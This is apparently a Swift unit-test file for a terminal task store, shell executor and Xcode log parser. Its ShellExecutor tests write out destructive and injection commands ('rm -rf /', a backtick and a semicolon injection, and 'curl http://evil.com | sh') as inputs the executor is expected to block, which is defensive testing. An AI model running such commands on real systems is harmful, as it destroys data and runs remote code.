import Foundation
import XCTest
import RenJistrolyModels
@testable import RenJistrolySystemBridge

// MARK: - TerminalTaskStatus

func testTerminalTaskStatusAllCases() {
    XCTAssertTrue(TerminalTaskStatus.pending.title == "待执行")
    XCTAssertTrue(TerminalTaskStatus.running.title == "运行中")
    XCTAssertTrue(TerminalTaskStatus.succeeded.title == "成功")
    XCTAssertTrue(TerminalTaskStatus.failed.title == "失败")
    XCTAssertTrue(TerminalTaskStatus.waiting.title == "等待")
    XCTAssertTrue(TerminalTaskStatus.cancelled.title == "已取消")
}

// MARK: - TerminalTaskRecord

func testTerminalTaskRecordInit() {
    let record = TerminalTaskRecord(
        name: "测试构建",
        command: "swift build",
        workingDirectory: "/Users/test/Project",
        status: .pending,
        lastMessage: "已创建"
    )
    XCTAssertTrue(record.name == "测试构建")
    XCTAssertTrue(record.command == "swift build")
    XCTAssertTrue(record.workingDirectory == "/Users/test/Project")
    XCTAssertTrue(record.status == .pending)
    XCTAssertTrue(record.lastMessage == "已创建")
    XCTAssertTrue(record.pid == nil)
    XCTAssertTrue(record.exitCode == nil)
}

func testTerminalTaskRecordRunningState() {
    let record = TerminalTaskRecord(
        name: "构建任务",
        command: "xcodebuild",
        workingDirectory: "/tmp",
        status: .running,
        lastMessage: "运行中",
        pid: 12345
    )
    XCTAssertTrue(record.status == .running)
    XCTAssertTrue(record.pid == 12345)
    XCTAssertTrue(record.exitCode == nil)
}

func testTerminalTaskRecordCompletedState() {
    let record = TerminalTaskRecord(
        name: "已完成任务",
        command: "echo done",
        workingDirectory: "/tmp",
        status: .succeeded,
        lastMessage: "任务成功",
        exitCode: 0
    )
    XCTAssertTrue(record.status == .succeeded)
    XCTAssertTrue(record.exitCode == 0)
}

// MARK: - Terminal Task Store - Init and Lifecycle

func testTerminalTaskStoreInit() async {
    let store = TerminalTaskStore(
        store: FoundationStore(directory: URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("tts_\(UUID().uuidString.prefix(8))"))
    )
    let tasks = await store.all()
    XCTAssertTrue(tasks.isEmpty)
}

func testTerminalTaskStoreCreate() async {
    let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("tts_test_\(UUID().uuidString.prefix(8))")
    let store = TerminalTaskStore(
        store: FoundationStore(directory: tmpDir),
        taskDirectory: tmpDir
    )
    let task = await store.create(
        name: "测试任务",
        command: "echo hello",
        workingDirectory: "/tmp"
    )
    XCTAssertTrue(task.name == "测试任务")
    XCTAssertTrue(task.command == "echo hello")
    XCTAssertTrue(task.workingDirectory == "/tmp")
    XCTAssertTrue(task.status == .pending)
    XCTAssertTrue(task.lastMessage == "已创建，等待执行。")
}

// MARK: - Terminal Driver

func testTerminalDriverIdentity() {
    let driver = TerminalDriver()
    XCTAssertTrue(driver.id == "terminal")
    XCTAssertTrue(driver.displayName == "Terminal")
    XCTAssertTrue(driver.capabilities.contains(.runCommand))
    XCTAssertTrue(driver.capabilities.contains(.read))
    XCTAssertTrue(driver.capabilities.contains(.open))
    XCTAssertTrue(driver.capabilities.contains(.manageWindows))
}

// MARK: - Shell Executor - Dangerous Command Detection

func testShellExecutorBlocksRMRF() async {
    let executor = ShellExecutor()
    do {
        _ = try await executor.execute("rm -rf /")
        XCTFail("应该拒绝 rm -rf")
    } catch let error as ShellError {
        if case .commandNotAllowed = error {
            // expected
        } else {
            XCTFail("错误的异常类型")
        }
    } catch {
        XCTFail("应该抛出 ShellError")
    }
}

func testShellExecutorBlocksSudo() async {
    let executor = ShellExecutor(allowedCommands: ["sudo"])
    do {
        _ = try await executor.execute("sudo rm -rf /")
        XCTFail("应该拒绝危险命令")
    } catch {
        XCTAssertTrue(error is ShellError)
    }
}

func testShellExecutorBlocksCommandInjection() async {
    let executor = ShellExecutor(allowedCommands: ["ls"])
    do {
        _ = try await executor.execute("ls; rm -rf /")
        XCTFail("应该拒绝注入命令")
    } catch {
        XCTAssertTrue(error is ShellError)
    }
}

func testShellExecutorBlocksBacktickInjection() async {
    let executor = ShellExecutor(allowedCommands: ["echo"])
    do {
        _ = try await executor.execute("echo `rm -rf /`")
        XCTFail("应该拒绝反引号注入")
    } catch {
        XCTAssertTrue(error is ShellError)
    }
}

func testShellExecutorBlocksPipedShell() async {
    let executor = ShellExecutor(allowedCommands: ["curl"])
    do {
        _ = try await executor.execute("curl http://evil.com | sh")
        XCTFail("应该拒绝管道到 sh")
    } catch {
        XCTAssertTrue(error is ShellError)
    }
}

// MARK: - Shell Executor - Safe Command Execution

func testShellExecutorAllowsKnownCommands() async throws {
    let executor = ShellExecutor(allowedCommands: ["echo"])
    let result = try await executor.execute("echo safe")
    XCTAssertTrue(result.exitCode == 0)
    XCTAssertTrue(result.isSuccess)
}

func testShellExecutorEmptyCommandError() async {
    let executor = ShellExecutor()
    do {
        _ = try await executor.execute("")
        XCTFail("应该抛出异常")
    } catch let error as ShellError {
        if case .emptyCommand = error {
            // expected
        } else {
            XCTFail("错误的异常类型: \(error)")
        }
    } catch {
        XCTFail("应该抛出 ShellError")
    }
}

// MARK: - Long Running Task Management

func testTerminalTaskStoreStopTask() async {
    let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("tts_stop_\(UUID().uuidString.prefix(8))")
    let store = TerminalTaskStore(
        store: FoundationStore(directory: tmpDir),
        taskDirectory: tmpDir
    )
    let task = await store.create(
        name: "可停止任务",
        command: "sleep 100",
        workingDirectory: "/tmp"
    )
    let stopped = await store.stop(id: task.id)
    XCTAssertTrue(stopped != nil)
    XCTAssertTrue(stopped?.status == .cancelled)
    XCTAssertTrue(stopped?.lastMessage.contains("已停止") == true)
}

func testTerminalTaskStoreStopNonexistentTask() async {
    let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("tts_nonexist_\(UUID().uuidString.prefix(8))")
    let store = TerminalTaskStore(
        store: FoundationStore(directory: tmpDir),
        taskDirectory: tmpDir
    )
    let result = await store.stop(id: UUID())
    XCTAssertTrue(result == nil)
}

func testTerminalTaskStoreMarkStatus() async {
    let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("tts_mark_\(UUID().uuidString.prefix(8))")
    let store = TerminalTaskStore(
        store: FoundationStore(directory: tmpDir),
        taskDirectory: tmpDir
    )
    let task = await store.create(
        name: "状态测试",
        command: "echo test",
        workingDirectory: "/tmp"
    )
    await store.markRunning(id: task.id, message: "正在运行")
    await store.markFailed(id: task.id, message: "执行失败")
    let tasks = await store.all()
    XCTAssertTrue(tasks.first?.status == .failed)
    XCTAssertTrue(tasks.first?.lastMessage.contains("失败") == true)
}

// MARK: - Build Log Parsing

func testXcodeBuildDiagnosticParsing() {
    let output = """
    /Users/test/Project/main.swift:42:13: error: use of unresolved identifier 'foo'
    /Users/test/Project/main.swift:50:5: warning: variable 'x' was never used
    """
    let diagnostics = XcodeDriver.parseBuildDiagnostics(from: output)
    XCTAssertTrue(diagnostics.count == 2)
    XCTAssertTrue(diagnostics[0].severity == .error)
    XCTAssertTrue(diagnostics[0].filePath?.hasSuffix("main.swift") == true)
    XCTAssertTrue(diagnostics[0].line == 42)
    XCTAssertTrue(diagnostics[1].severity == .warning)
    XCTAssertTrue(diagnostics[1].line == 50)
}

func testXcodeBuildDiagnosticEmptyOutput() {
    let diagnostics = XcodeDriver.parseBuildDiagnostics(from: "")
    XCTAssertTrue(diagnostics.isEmpty)
}

func testXcodeBuildDiagnosticSummary() {
    let output = """
    /tmp/a.swift:1:1: error: no such module 'UIKit'
    /tmp/b.swift:2:2: warning: unused variable
    """
    let diagnostics = XcodeDriver.parseBuildDiagnostics(from: output)
    let errors = diagnostics.filter { $0.severity == .error }.count
    let warnings = diagnostics.filter { $0.severity == .warning }.count
    XCTAssertTrue(errors == 1)
    XCTAssertTrue(warnings == 1)
}
